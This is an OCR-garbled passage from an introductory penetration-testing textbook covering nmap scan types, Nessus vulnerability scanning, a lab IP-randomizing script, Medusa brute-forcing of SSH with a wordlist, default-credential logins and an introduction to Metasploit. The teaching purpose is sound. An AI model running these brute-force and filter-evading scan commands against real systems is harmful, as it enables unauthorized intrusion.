the most common port scanning mistakes of new penetration testers is that they overlook U dP. t hese aspiring hackers oftentimes fire up n map, run a single scan (typically a s Yn scan), and move onto vulnerability scanning. d o not neglect to scan U dP ports! failing to scan your target for open U dP ports f IGURE 3.3 SYN Scan and Results."},{"pageNumber":72,"pageContent":"Scanning ChApTER 3 53 is like reading the c liff n otes version of a book. You will probably have a solid understanding of the story, but you arre likely to miss many of the details. i t is important to understand that both t cP c onnect scans and s Yn scans use t cP as the basis for their communication. t cP is an acronym for transmission c ontrol Protocol. U dP is an acronym for User d atagram Protocol. c omputers can communicate with one another using either t cP or U dP; however, there are several key differences between the two protocols. t c P is considered a “connection oriented protocol” because it requires that the communication between both the sender and the receiver stays in sync. th is process ensures that the packets sent from one computer to another arrive at the receiver intact and in the order they were sent. on the other hand, U dP i s said to be “connectionless” because the sender simply sends packets to the receiver with no mechanism for ensuring that the packets arrive at the desti- nation. th ere are many advantages and disadvantages to each of the protocols including speed, reliability, and error checking. to truly master port scanning, you will need to have a solid understanding of these protocols. ta ke some time and learn about each of them. re call that earlier the three-way handshake process was described by compar- ing the process to a phone call. th e three-way handshake is a key component of t c P communication that allows the sender and the receiver to stay in sync. Because U dP is connectionless, this type of communication is most often com- pared to dropping a letter in a mailbox. in most cases, the sender simply writes an address on an envelope, puts a stamp on the letter, and puts the letter in the mailbox. ev entually, the mailman comes along and picks up the letter where it is entered into the mail routing system. in this example, there is no return receipt or delivery confirmation for the sender. on ce the mailman takes the let- ter, the sender has no guarantee that the letter will get to its final destination. n ow that you have a very simple understanding of the difference between t cP and U dP, it is important to remember that not every service utilizes t cP. s everal prominent services make use of UP d including d HcP, dns (for indi- vidual lookups), snm P, and tft P. o ne of the most important traits for a pen- etration tester to have is thoroughness. i t will be quite embarrassing to you if you overlook or miss a service because you forgot to run a U dP scan against your target. Both the t cP c onnect scan and the s Yn scan use t cP as the basis for their scanning techniques. i f we want to discover services utilizing U dP, we need to instruct n map to create scans using U dP packets. fortunately , n map makes this process very simple. to run a U dP scan against our target, we would enter the following command in a terminal: nmap –sU 172.16.45.129 notice the difference between this command and the others we have learned. f irst, we specify the n map U dP scan by using the “–sU” command. Astute readers will also notice that the “-p-“ and the “–P n” switches have been"},{"pageNumber":73,"pageContent":"The Basics of hacking and penetration T esting 54 dropped from the scan. t he reason for this is simple. U dP scans are very slow; running even a basic U dP scan on the default 1,000 ports can take 20–30 min- utes. You may also notice that the i P address has changed. i n this example, we are scanning a l inux machine with the tft P service running. t his will allow us to see the UP d scan with results. figure 3.4 shows the output of the scan. i t is important to remember that U dP communication does not require a response from the receiver. i f the target machine does not send back a reply saying a packet was received, how can n map differentiate between an open port and a filtered (firewalled) port? i n other words, if a service is available and accepting U dP packets, the normal behavior for this service is to simply accept the packet but not send a message back to the receiver saying “ got it !” l ikewise, a common firewall strategy is to simply absorb the packet and not send a response packet back to the sender. i n this example, even though one packet went through and one packet was blocked, because no packets were returned to the sender, there is no way of knowing if the packet was accepted by a service or dropped by the firewall. t his conundrum makes it very difficult for n map to determine if a U dP port is open or filtered. As a result when n map does not receive a response from a UdP scan, it returns the following message for the port “open | filtered.” i t is important to note that on rare occasions a U dP service will send a response back to the original source. i n these cases, n map is smart enough to under- stand that there is clearly a service listening and responding to requests and will mark those ports as “open.” As was discussed earlier, oftentimes people who are new to port scanning over- look U dP scans. t his is probably due in part to the fact that most ordinary UdP port scans provide very little information and mark nearly every port as “open | filtered.” After seeing the same output on several different hosts, it is easy to become disillusioned with U dP scans. However, all is not lost! t he fine folks who wrote n map provide us with a way to draw more accurate results from our U dP scans. f IGURE 3.4 UPD Scan Command and Result."},{"pageNumber":74,"pageContent":"Scanning ChApTER 3 55 to elicit a more useful response from our target, we can add the “–sV” switch to our U dP scan. t he “–sV” switch is used for version scanning but, in this case, can also help us narrow the results of our UP d scan. w hen version scanning is enabled, n map sends additional probes to every “open | filtered” port that is reported by the scan. t hese additional probes attempt to identify services by sending specifically crafted packets. t hese spe- cially crafted packets are often much more successful in provoking a response from the target. o ftentimes, this will change the reported results from “open | filtered” to “open.” As mentioned above, the simplest way to add version scanning to a U dP probe is to include the “–sV” switch. Please note that because we are already using the “–sU” switch to specify the type of scan, we can simply append the capital V onto the back of the “–sU.” As a result, our new command becomes: nmap –sUV 172.16.45.135 Using Nmap to perfor m an Xmas Scan in the computer world, an rfc is a document that contains either notes or the technical specifications covering a given technology or standard. rfc s can provide us with a tremendous amount of detail about the inner workings of a particular system. Because rfc s describe the technical details of how a system should work, attackers and hackers will often review rfc s looking for potential weaknesses or loopholes described in the documentation. x mas tree scans and n ull scans exploit just such a loophole. xm as tr ee scans get their name from the fact that the f in , P sH , and U r g packet flags are set to “on”; as a result, the packet has so many flags turned on and the packet is often described as being “lit up like a ch ristmas tree.” gi ven what we already know about t cP communications and the three-way hand- shake, it should be clear that an xm as tr ee packet is highly unusual because nei- ther the sYn nor A c k flags are set. However, this unusual packet has a purpose. if the system we are scanning has followed the t cP r fc implementation, we can send one of these unusual packets to determine the current state of the port. th e t cP r fc says that if a closed port receives a packet that does not have a sYn, A c k, or r st flag set (i.e., the type of packet that is created from an xm as tr ee scan), the port should respond with an r st packet of its own. fu rthermore, the r fc states that if the port is open and it receives a packet without a sYn, Ac k, or r st flag set the packet should be ignored. ta ke a moment to reread the last two sentences, as they are critical to understanding the response we get from these scans. Assuming the operating system of the target fully complies with the t cP rfc , n map is able to determine the port state without completing or even initiating a connection on the target system. t he word “assuming” was used because not every operating system on the market today is fully rfc compliant. i n general, the x mas tree and n ull scans work against Unix and l inux machines but not"},{"pageNumber":75,"pageContent":"The Basics of hacking and penetration T esting 56 windows. As a result, x mas tree and n ull scans are rather ineffective against m icrosoft targets. to execute an x mas tree scan, we simply replace the “-sU” switch from our last example with an “-s x.” to run the full scan in the terminal, w e would enter: nmap –sX -p- -PN 172.16.45.129 figure 3.5 shows the command and output of an x mas tree scan against a l inux target. Using Nmap to perfor m Null Scans null scans, like x mas tree scans, are probes made with packets that violate tra- ditional t cP communication. i n many ways, the n ull scan is the exact oppo- site of a x mas tree scan because the n ull scan utilizes packets that are devoid of any flags (completely empty). target systems will respond to n ull scans in the exact same way they respond to x mas tree scans. s pecifically, an open port on the target system will send no response back to n map, whereas a closed port will respond with an rst packet. i t is important to remember that these scans are only reliable for oper- ating systems that comply 100 percent with the tc P rfc. o ne of the main advantages of running x mas tree and n ull scans is that in some cases, you are able to bypass simple filters and Access c ontrol l ists (Acl s). s ome of these primitive filters work by blocking inbound s Yn packets. t he thought with this type of filter is that by preventing the s Yn packet from entering the system, it is not possible for the three-way handshake to occur. i f the three-way handshake does not occur, there can be no t cP communication streams between the systems, or more precisely, no t cP communications can be originated from outside of the filter. i t is important to understand that neither the x mas tree nor the n ull scans seek to establish any type of communication channel. t he whole goal of these scans is to determine if a port is open or closed. f IGURE 3.5 Xmas Tree Scan Command and Result."},{"pageNumber":76,"pageContent":"Scanning ChApTER 3 57 with the previous two paragraphs in mind, consider the following example. Assume that our n etwork Admin Ben o wned puts a simple firewall in front of his system to prevent anyone outside of his network from connecting to the system. t he firewall works by simply dropping any external communica- tions that begin with a s Yn packet. Ben hires his buddy, the ethical hacker, to scan his system. t he ethical hacker’s initial t cP c onnect scans show nothing. However, being a seasoned penetration tester, the ethical hacker follows up his initial scan with U dP, x mas tree , and n ull scans. t he ethical hacker smiles when he discovers that both his x mas tree scans and n ull scans reveal open ports on Ben’s system. t his scenario is possible because n map creates packets without the s Yn flag set. Because the filter is only dropping incoming packets with the s Yn flag, the x mas tree and n ull packets are allowed through. to run a n ull scan, we issue the following command in a terminal: nmap –sN -p- -PN 172.16.45.129 por t Scanning Wrap Up now that we have covered the basics of port scanning, there are a few addi- tional switches that need to be covered. t hese switches provide additional functionality that may be useful to you as you progress in your penetration testing career. As mentioned earlier, the “-sV” switch is used for version scanning. w hen con- ducting version scanning, n map sends probes to the open port in an attempt to determine specific information about the service that is listening. w hen possible, n map will provide details about the service including version num- bers and other banner information. t his information should be recorded in your notes. i t is recommended that you use the “-sV” switch whenever possi- ble, especially on unusual or unexpected ports, because a wily administrator may have moved his web server to port 34567 in an attempt to obscure the service. n map includes an option to change the speed of your port scan. t his is done with the “- t” switch. t he timing switch ranges on a numeric scale from 0 to 5, with 0 being the slowest scan and 5 being the fastest. t iming options are useful if you are attempting to avoid detection by sending your scan more slowly; or if you have a large number of i Ps to scan and you have a limited time to com- plete the scan where faster scans would be more appropriate. Please be aware that by using the fastest scans possible, nmap may provide less accurate results. l astly, the “- o” switch can be useful for fingerprinting the operating system. t his is handy for determining if the target you are attacking is a w indows, l inux, or other type of machine. k nowing the operating system of your target will save you time by allowing you to focus your attacks to known weaknesses of that system. t here is no use in exploring exploits for a l inux machine if your target is running windows."},{"pageNumber":77,"pageContent":"The Basics of hacking and penetration T esting 58 once we have completed port scanning our target, we should have a list of open ports and services. t his information should be documented and reviewed closely. w hile reviewing the n map output, you should take a few moments to attempt to log into any remote access services that were discovered in your port scan. t he next chapter will address running a brute force tool to attempt to log in. for the time being, you can attempt to log in using default usernames and passwords. You could also try logging in using any information, usernames, or e-mail addresses you found during reconnaissance. i t is possible to complete a penetration test by simply discovering an open remote connection and logging into the box with a default username and password. telnet and ss H are great remote services that you should always try to connect to. You can do this from the command line by typing: telnet target_ip ssh root@target_ip in this example, the “target_ip” is the i P address of your victim. m ost likely these will fail, but on the rare occasion when you are successful, these are an absolute home run. vULNERABILIT y SCANNING now that we have a list of i Ps, open ports, and services on each machine, it is time to scan the targets for vulnerabilities. A vulnerability is a weakness in the software or system configuration that can be exploited. Vulnerabilities can come in many forms but most often they are associated with missing patches. Vendors often release patches to fix a known problem or vulnerability. Unpatched software and systems often lead to quick penetration tests because some vulnerabilities allow remote code execution. remote code execution is definitely one of the holy grails of hacking. i t is important to understand this step as the results will feed directly into step 3 where we will gain access to the system. to scan systems for vulnerabilities, we will use a vulnerability scanner. t here are several good scanners available to you but for this book we will be focusing on nessus. ne ssus is a great tool and available for free, for a home user, from their website. You can download a full-fledged version of ne ssus and get a key for free. if you are going to use ne ssus in a corporate environment, you will need to sign up for the Professional fe ed rather than the Home fe ed. th e Professional fe ed will run you about $100 a month. we will be using the Home version for this book. in stalling ne ssus is very straightforward. it will run on either li nux or wi ndows. ne ssus runs using a client/server architecture. on ce set up, the server runs quietly in the background, and you interact with the server through a browser. to install ne ssus, you need to complete the following steps: 1. d ownload the installer from www.nessus.org. 2. r egister for a key on the n essus website by submitting your e-mail address. t he n essus crew will e-mail you a unique product key that can be used to register the product."},{"pageNumber":78,"pageContent":"Scanning ChApTER 3 59 3. i nstall the program. 4. c reate a nessus user to access the system. 5. Update the plug-ins . o ne of the key components of n essus is the plug-ins. A plug-in is a small block of code that is sent to the target machine to check for a known vulner- ability. n essus has literally thousands of plug-ins. t hese will need to be down- loaded the first time you start the program. t he default installation will set up n essus to automatically update the plug-ins for you. o nce you have installed the n essus server, you can access it by opening a browser and entering https://127.0.0.1:8834 in the U rl (assuming you are accessing n essus on the same computer you installed the server on). d o not forget the “https” in the U rl as n essus uses a secure connection when com- municating with the server. You will be prompted with a log-in screen. You can use the username and password you created when installing the program. o nce you log into the program, you will be presented with a screen similar to f igure 3.6. Before we can use n essus, we need to set up a scan policy. You can do this by clicking on the “Policies” tab at the top of the web page. to set up a scan policy, you need to provide a name. i f you are going to set up multiple policies, you should also enter a description. Please take a minute to review f igure 3.6 and notice there is a check in the box next to “ safe checks.” w hen setting up n essus for the first time, it is common to create two policies: one with the “ safe c hecks” checked and the other with the “ safe c hecks” unchecked. t he reason for this is simple. s ome plug-ins and checks are considered dangerous because they check for the vulnerability by attempt- ing to actually exploit the system. Be aware that removing the “ safe c hecks” f IGURE 3.6 Screenshot of Nessus."},{"pageNumber":79,"pageContent":"The Basics of h acking and p enetration Testing 60 check has the potential to cause network and system disruptions or even take systems off-line. By setting up one policy with the “ s afe c hecks” enabled and one with the “ s afe c hecks” disabled, you can avoid unintentional network disruptions. t here are many options that you can use to customize your scan. f or the pur- pose of this book, we will use the defaults. t ake a moment to review the vari- ous options by clicking “ n ext” in the lower right. t his will take you through each of the remaining pages where you can set additional options for your scan. o nce your scan is set, you can save it by clicking on the “ s ubmit” button that will appear after you have reviewed each of the scan option pages. You only need to set up your scan policy one time. o nce your scan has been submitted, you will be able to use that policy to perform vulnerability scans against your target. n o w that you have a scan policy set up, you can run a scan against your target. t o set up a scan, you need to click on the “ s cans” link located in the top menu. You can enter individual addresses to scan a single target or a list of i Ps to scan multiple hosts. f igure 3.7 sho ws the “ s can” screen. f IGURE 3.7 Setting up the Nessus Scan. D o w n l o a d f r o m W o w ! e B o o k < w w w . w o w e b o o k . c o m >"},{"pageNumber":80,"pageContent":"Scanning ChApTER 3 61 You need to enter a name for the scan, select a policy, and enter the i P address of your targets. You can enter your target i P addresses individually in the “ scan targets” box or if you have your target i P addresses saved to a text file, you can use the “Browse ... ” button to locate and load it. o nce your options are set, you can click on the “ launch s can” button in the lower right. n essus will provide you with information about the progress of your scan while it is running. w hen n essus finishes the scan, you will be able to review the results by click- ing on the “ r eports” link in the menu bar. t he report will provide you with a detailed listing of all the vulnerabilities that n essus discovered. we are espe- cially interested in vulnerabilities labeled as High. You should take time to closely review the report and make detailed notes about the system. we will use these results in the next step to gain access to the system. o nce we have completed port scanning and vulnerability scanning for each of our targets, we should have enough information to begin attacking the system. hOW DO I p RACTICE ThIS STE p? the easiest way to practice port scanning is to set up two machines or use virtual machines. You should work your way through each of the options and scan types that we covered in this chapter. Pay special attention to the out- put from each scan. You should run scans against both l inux and w indows boxes. You will probably want to add some services or programs to the target system so that you can be sure you will have open ports. i nstalling and starting ft P, a web server, telnet, or ssH will work nicely. w hen a person is first learning about port scanning, one of the best ways to practice is to pick a subnet and hide an i P address in the network. After hid- ing the target in the subnet, the goal is to locate the target. o nce the target has been located, the next step is to conduct a full port scan of the s ystem. to assist with the scenario described above, a simple script has been created, which can be used to “hide” your system in a given subnet. t he code is meant to be run on a l inux machine. feel free to modify it by changing the i P address so that it will work on your network. t he script generates a random num- ber between 1 and 254. t his number is to be used as the final octet in the i P address. o nce the random i P address is created, the script applies the address to the machine. running this script will allow you to become familiar with the tools and tech- niques we covered in this chapter. You can enter the script into a text editor and save the file as iP_gen.sh."},{"pageNumber":81,"pageContent":"The Basics of hacking and penetration T esting 62 #!/bin/bash echo \"Setting up the victim machine, this will take just a moment...\" ifconfig eth0 down ifconfig eth0 172.16.45.$((( $RANDOM %254)  1)) up # uncomment the following lines by removing the #, to start up services on your victim # please note, you may need to change the location / path depending on your distro #/etc/init.d/ssh start # note, you may have to generate your SSH key using sshd-generate #/etc/init.d/apache2 start #/etc/init.d/atftpd start echo \"This victim machine is now setup.\" echo \"The IP address is somewhere in the 172.16.45.0/24 network.\" echo \"You may now close this window and begin your attack...Good luck!\" You will need to use a terminal to navigate to the directory where you created the file. You need to make the file executable before you can run it. You can do this by typing: chmod 755 IP_Gen.sh to run the script, y ou type the following command into a terminal: ./IP_Gen.sh the script should run and provide you with a message saying the victim machine is all set up. Using the script above you will be able to practice locat- ing and scanning a target machine. Wh ERE DO I GO fROM hERE ? once you have mastered the basics of n map and n essus, you should dig into the advanced options for both tools. t his chapter only scratched the surface of both of these fine tools. i nsecure.org is a great resource for learning more about nmap. You should dedicate time to exploring and learning all of the var- ious switches and options. l ikewise, n essus has a plethora of additional fea- tures. take time to review the v arious scans and policy options. After you are comfortable with the advanced features of these tools, you should look at other scanners as well. t here are dozens of good port scanners avail- able. Pick a few, install them, and learn their features. t here are several com- mercial products that you should become familiar with; these products are not exclusively vulnerability scanners (they are much more), but c ore i mpact and s aint both provide excellent vulnerability assessment components, although both of these tools will cost you actual cash."},{"pageNumber":82,"pageContent":"Scanning ChApTER 3 63 SUMMAR y this chapter focused on step 2 that consists mainly of scanning. t he chapter started with a brief overview of pings and ping sweeps before moving into the specifics of scanning. t he topic of scanning is further broken down into two distinct types including port scanning and vulnerability scanning. t he port scanner n map was introduced and several different types of scans were dis- cussed. Actual examples and outputs of the various scans were demonstrated as well as the interpretation of the n map output. t he concept of vulnerability scanning was introduced through the use of n essus. Practical examples were presented and discussed throughout the chapter."},{"pageNumber":83,"pageContent":"This page intentionally left blank"},{"pageNumber":84,"pageContent":"65 INTRODUCTION exploitation is the process of gaining control over a system. t his process can take many different forms but for the purpose of this book the end goal always remains the same: administrative-level access to the computer. i n many ways, Exploitation ChApTER 4 Information in This Chapter: n Gaining Access to Remote Ser vices with Medusa n Metasploit: Hacking Hugh Jackman Style! n John the Ripper : King of the Password Crackers n P assword Resetting: Kind of Like Driving a Bulldozer through the Side of a Building n Sniffing Networ k Traffic n Macof: Making Chick en Salad Out of Chicken Sh*t n F ast-Track Autopwn: Breaking Out the M-60"},{"pageNumber":85,"pageContent":"The Basics of hacking and penetration T esting 66 exploitation is the attempt to turn the target machine into a puppet that will execute your commands and do your bidding. Just to be clear, exploitation is the process of launching an exploit. An exploit is the realization of a vulner- ability. e xploits are issues or bugs in the software code that allow a hacker or attacker to alter the original functionality of the software. o f all the steps we cover, exploitation is probably the step aspiring hackers are most interested in. i t certainly gets a lot of attention because this phase involves many of the traditional activities that people associate with “hacking” and penetration testing. t here are volumes of books that are dedicated to the process of exploitation. Unfortunately, there are also volumes of misinforma- tion regarding step 3. s tories from Hollywood and urban legends of famed hacker exploits have tainted the mind of many newcomers. However, this does not mean that exploitation is any less exciting or exhilarating. o n the contrary, exploitation is still my favorite step, even if there is a little less “shock and awe” than portrayed in a typical hacker movie. But when completed successfully, exploitation remains simply breathtaking. o f all the steps we discuss, exploitation is probably the least well defined and most open to interpretation. w hen combined, these two qualities often bring chaos and confusion to people trying to learn penetration testing and hacking. t he lack of order and structure in a penetration test often leads to frustration and failure. i t is not uncommon for a novice to read about a new tool, or lis- ten to a speaker talk about some advanced technique that can be used to gain access to a system, and want to jump directly to step 3 (exploitation). However, it is important to remember that penetration testing is more than just exploi- tation. fortunately by following the process identified in this book or by any other solid penetration testing methodology, you can alleviate many of these issues. Because this book focuses on the basics, and as a final warning, it is critical to stress the importance of completing steps 1 and 2 prior to conducting exploi- tation. i t can be tempting to bypass reconnaissance and scanning and jump directly to c hapter 4. t hat is ok for now, but if you are ever going to advance your skills beyond the script kiddie level, you will need to master the other steps as well. t he failure to do so will not only severely limit your ability to grow as a penetration tester but will also eventually stunt your growth as an exploitation expert. reconnaissance and scanning will help to bring order and direction to exploitation. ok . n ow that the speech is over, let us put away the soapbox and get to the business at hand: exploitation. As mentioned earlier, exploitation is the most free-flowing phase we will cover. t he reason for this is simple; each system is different and each target is unique. d epending on a multitude of factors, your attack vectors will vary from target to target. d ifferent operating systems, dif- ferent services, and different processes require different types of attacks. s killed attackers have to understand the nuances of each system they are attempting to exploit. As your skills continue to progress from Padawan to Jedi, you will"},{"pageNumber":86,"pageContent":"Exploitation ChApTER 4 67 need to expand your knowledge of systems and their exploits. e ventually, you will learn how to create custom exploits. You can use the previous step’s output as a guide for where to begin your exploitation attempts. t he output from scanning should be used to help shape, focus, and direct your attacks. GAINING ACCESS TO REMOTE SER v ICES WIT h MEDUSA wh en reviewing the output from step 2, always make special notes of iP a ddresses that include some type of remote access service. s sH , te lnet, f tP , P c Anywhere, and V n c are popular choices because gaining access to these ser- vices often results in the complete owning of that target. Upon discovery of one of these services, hackers typically turn to an “online password cracker.” on line password crackers work by attempting to brute force their way into a system by trying an exhaustive list of passwords and/or username combinations. w hen using online password crackers, the potential for success can be greatly increased if you combine this attack with information gathered from step 1. s pecifically you should be sure to include any usernames or passwords you discovered. t he process of online password cracking literally requires the attacking program to send a username and a password to the target. i f either the username or password is incorrect, the attack program will be presented with an error message and the log-in will fail. t he password cracker will then send the next username and password combination. t his process continues until the program is either successful in finding a login/password combo or it exhausts all the guesses. o n the whole, even though computers are great at repetitive tasks like this, the process is rather slow. You should be aware that some remote access systems employ a password throttling technique that can limit the number of unsuccessful log-ins you are allowed. i n these instances either your i P address can be blocked or the user- name can be locked out. t here are many different tools that can be used for online password cracking. tw o of the most popular tools are m edusa and Hydra. t hese tools are very similar in nature. i n this book, the focus will be on m edusa, but it is strongly encouraged that you become familiar with Hydra as well. m edusa is described as a parallel log-in brute forcer that attempts to gain access to remote authentication services. m edusa is capable of authenticating with a large number of remote services including A fP, ft P, H ttP, im AP, ms -sQl, m ysQl, n etware nc P, nnt P, PcAnywhere, P oP3, rexec , rlogin , smt P- AU tH, snmP, ssHv2, telnet, V nc, web form, and more . i n order to use m edusa, you need several pieces of information including the target i P address, a username or username list that you are attempting to log in as, a password or dictionary file containing multiple passwords to use"},{"pageNumber":87,"pageContent":"The Basics of hacking and penetration T esting 68 when logging in, and the name of the service you are attempting to authenti- cate with. on e of the requirements listed above is a dictionary list. A password dictionary is a file that contains a list of potential passwords. th ese lists are often referred to as dictionaries because they contain thousands or even millions of individual words. People often use plain en glish words or some small variation like a 1 for an i, or a 5 for an s when they create passwords. Password lists attempt to collect as many of these words as possible. so me hackers and penetration testers spend years building password dictionaries that grow to gigabytes in size. A good dic- tionary can be extremely useful but often requires a lot of time and attention to keep clean. cl ean dictionaries are streamlined and free of duplication. t here are plenty of small wordlists that can be downloaded from the i nternet and serve as a good starting point for building your own personal password dictionary. t here are also tools available that will build dictionaries for us. However, fortunately, the fine folks at Backtrack have already included a few word lists for us to use. You can find these dictionaries in the /pentest/pass- words/wordlists directory. t here is also a small list included with the John the ripper located at: /pentest/passwords/jtr/password.lst. once you have your password dictionary, you need to decide if you are going to attempt to log in as a single user or if you want to supply a list of potential users. i f your reconnaissance efforts were rewarded with a list of usernames, you may want to start with those. i f you were unsuccessful in gathering user- names and passwords, you may want to focus on the results of the e-mail addresses you collected with t he Harvester. remember the first part of an e-mail address can often be used to generate a working domain username. Assume that during your penetration test you were unable to find any domain usernames. However, t he Harvester was able to dig up the e-mail address ben. owned@example.com. w hen using m edusa, one option is to create a list of potential usernames based on the e-mail address. t hese would include ben. owned, benowned, bowned, ownedb, and several other combinations derived from the e-mail address. After creating a list of 5–10 usernames, it is possible to feed this list into m edusa and attempt to brute force my way into the remote authentication service. n ow that we have a target i P address with some remote authentication ser- vice (we will assume ss H for this example), a password dictionary, and at least one username, we are ready to run m edusa. i n order to execute the attack, you open a terminal and issue the following command: medusa –h target_ip –u username –P path_to_password_dictionary –M authentication_service_to_attack take a moment to examine this command in more detail; you will need to cus- tomize the information for your target: t he first keyword “medusa” is used to start the brute forcing program. “-h” is used to specify the iP address of the target host."},{"pageNumber":88,"pageContent":"Exploitation ChApTER 4 69 the “-u” is used to denote a single username that m edusa will use to attempt log-ins. i f you generated a list of usernames and would like to attempt to log in with each of the names on the list, you can issue a capital “-U” followed by the path to the username file. l ikewise, the lowercase “-p” is used to specify a single password, whereas a capital “-P” is used to specify an entire list containing multiple passwords. t he “-P” needs to be followed by the actual location or path to the diction- ary file. t he “-m” switch is used to specify which service we want to attack. to clarify this attack, let us continue with the example we set up earlier. su ppose we have been hired to conduct a penetration test against the com- pany “ ex ample.com.” du ring our information gathering with me ta go ofi l, we uncover the username of “ownedb” and an iP address of 172.16.45.129. After port scanning the target, we discover that the server is running s sH on port 22. mo ving to step 3, one of the first things to do is to attempt to brute force our way into the server. After firing up Backtrack and opening a terminal, we issue the following command: medusa –h 172.16.45.129 –u ownedb –P /pentest/passwords/wordlists/ darkc0de.lst –M ssh figure 4.1 shows the command and its associated output. f IGURE 4.1 Using Medusa to Brute Force into SSH."},{"pageNumber":89,"pageContent":"The Basics of hacking and penetration T esting 70 th e first line shows the command we issued; the second line is an informa- tional banner that is displayed when the program begins. th e remaining lines show a series of log-in attempts with the username “ownedb” and various pass- words beginning with “[1B].” no tice on the 11th log-in attempt me dusa is suc- cessful in accessing the system with a username of “ownedb” and a password of “!power.” At this point we would be able to remotely log in as the user. d epending on the level of engagement and goals identified in your authoriza- tion and agreement form, you may be done with the penetration test at this point. c ongratulations! You just completed your first penetration test and suc- cessfully gained access to a remote system. Although it is not always quite that easy, you will be surprised at how many times a simple tactic like this works and allows you full access and control of a remote system. METAS pLOIT : h ACKING , hUG h J ACKMAN STyLE! of all the tools discussed in this book, me tasploit is my favorite. in many ways, it is the quintessential hacker tool. it is powerful, flexible, free, and loaded with awesomeness. it is without a doubt the coolest offensive tool covered in this book and in some cases it even allows you to hack like Hugh Jackman in sw ordfish! se riously, it is that good. if you ever get a chance to meet H d mo ore or any of the other original me tasploit crew, buy them a beer, shake their hand, and say thanks, because me tasploit is A l l that and more. i n 2004, at d efcon 12, H d m oore and spoonm rocked the world when they gave a talk titled “ metasploit: Hacking l ike in the m ovies.” t his presentation focused on “exploit frameworks.” An exploit framework is formal structure for developing and launching exploits. f rameworks assist the development process by providing organization and guidelines for how the various pieces are assem- bled and interact with each other. m etasploit actually started out as a network game, but its full potential was realized when it was transformed into a full-fledged exploit tool. m etasploit actually contains a suite of tools including some great anti-forensics stuff; however, the project is probably best known for the m etasploit f ramework component. ALERT ! If you are having problems getting Medusa (or any of the tools covered in this book) to run on your version of Backtrack, it may be helpful to reinstall the program as we discussed in Chapter 1. You can reinstall Medusa with the following commands: apt-get update apt-get install medusa"},{"pageNumber":90,"pageContent":"Exploitation ChApTER 4 71 Before the release of me tasploit, security researchers had two main choices: they could develop custom code by piecing together various exploits and pay- loads or they could invest in one of the two commercially available exploit frameworks, c ore im pact or im unity se c’s cAnV As. Both im pact and cAnV As were great choices and highly successful in their own right. Unfortunately, the cost to license and use these products meant many security researchers did not have access to them. me tasploit was different from everything else because for the first time hack- ers and penetration testers had access to a truly open source exploit framework. th is meant that for the first time everyone could access, collaborate, develop, and share exploits for free. it also meant that exploits could be developed in an almost factory-like assembly line approach. t h e assembly line approach allowed hackers and penetration testers to build exploits based on their own needs. me tasploit allows you to select the target and choose from a wide variety of payloads. th e payloads are interchangeable and not tied to a specific exploit. A payload is the “additional functionality” or change in behavior that you want to accomplish on the target machine. it is the answer to the question: “ wh at do i want to do now that i have control of the machine?” me tasploit’s most popular payloads include adding new users, opening backdoors, and installing new software onto a target machine. th e full list of me tasploit payloads will be covered shortly. Before we begin covering the details of how to use me tasploit, it is important to understand the distinction between me tasploit and a vulnerability scanner. in most instances, when we use a vulnerability scanner, the scanner will only check to see if a system is vulnerable. th is occurs in a very passive way with little chance of any unintentional damage or disruption to the target. me tasploit and other frameworks are exploitation tools. th ese tools do not perform tests; these tools are used to complete the actual exploitation of the target. Vulnerability scanners look for and report potential weaknesses. me tasploit attempts to actu- ally exploit the systems it scans. ma ke sure you understand this. in 2009, ra pid 7 purchased me tasploit. H d mo ore spent a considerable amount of time putting people at ease and reassuring everyone that me tasploit would remain free. Although several great commercial products have since been released including me tasploit ex press and me tasploit Pro, H d has been true to his word and the original me tasploit project remains free. in fact, the purchase of me tasploit by ra pid 7 has been a huge boost to the me tasploit project. th e open source project is clearly benefitting from the commercial tool push with additional full-time developers and staff. th e rate at which new exploits and functionality is being added is staggering. we will focus on the basics here, but you will want to stay on top of latest developments going forward. m etasploit can be downloaded for free by clicking on the f ramework link located at http://www.metasploit.com. i f you are using Backtrack, m etasploit is already installed for you. t here are several different ways to interact with"},{"pageNumber":91,"pageContent":"The Basics of h acking and p enetration Testing 72 m etasploit, but this book will focus on using the menu-driven, non- g U i , text-based s ystem called the m sfconsole . o nce you understand the basics, the m sfconsole is fast, friendly, intuitive, and easy to use. w hen possible, you should avoid the m sfw eb or m sfgui v ersions especially when first learning. w e can access the m sfconsole by either opening a terminal window and entering: /pentest/exploits/framework3/msfconsole t he m sfconsole can also be accessed through the menu by clicking on the k - s tart dragon, and navigating to: Backtrack → Penetration → m etasploit e xploitation f ramew ork → f ramew ork Version 3 → m sfconsole . s tarting the m sfconsole takes between 10 and 30 seconds, so do not panic if nothing happens for a few moments. e v entually m etasploit will start by pre- senting you with a welcome banner and an “msf  ” command prompt. t here are several different m etasploit banners that are rotated and displayed at ran- dom so if your screen looks different from f igure 4.2, that is normal. t he important thing is that you get the msf  console. t he initial m etasploit screen is shown in f igure 4.2. Please notice, when m etasploit first loads, it shows you the number of exploits, payloads, encoders, and nops available. i t also shows you how many days have passed since your last update. Because of m etasploit’ s rapid growth and official funding, it is vital that you keep m etasploit up-to-date. t his is easily accom- plished by entering the following command after the “msf  ” prompt: msfup- date . g et into the habit of running this command often. n o w that m etasploit is updated, let us begin exploring the awesomeness of this tool. i n order to use m etasploit a target must be identified, and exploit must be f IGURE 4.2 Initial Metasploit Screen. D o w n l o a d f r o m W o w ! e B o o k < w w w . w o w e b o o k . c o m >"},{"pageNumber":92,"pageContent":"Exploitation ChApTER 4 73 selected, a payload needs to be picked, and the exploit itself must be launched. we will review the details of each of these in just a few moments but before that, let us review the basics of m etasploit terminology. As mentioned earlier, an exploit is a prepackaged collection of code that gets sent to a remote system. t his code causes some atypical behavior on the target system that allows us to execute a payload. recall that a payload is also a small snippet of code that is used to perform some task like installing new software, creating new users, or opening backdoors to the system. e xploits are the weaknesses that allow the attacker to execute remote code (payloads) on the target system. Payloads are the additional software or func- tionality that we install on the target system once the exploit has been success- fully executed. n ow that we have an understanding of how to access and start the m sfconsole and a solid understanding of the terminology used, let us examine how we can use m etasploit. w hen first hearing about and using m etasploit, a common mistake of would-be hackers and penetration testers is the lack of organization and thoughtfulness. remember , m etasploit is like a scalpel, not a hatchet. o r maybe more appropriately, m etasploit is like a Barrett m 107 sniper rifle, not a m 60 machine gun. m ost newcomers are overwhelmed by the sheer number of exploits and payloads; and usually get lost trying to find appropriate exploits. t hey spend their time blindly throwing every exploit against a target and hop- ing that something sticks. l ater in this chapter, we will examine a tool that works in this manner but for now we need to be a little more refined. ra ther than blindly spraying exploits at a target, we need to find a way to match up known system vulnerabilities with the prepackaged exploits in me tasploit. on ce 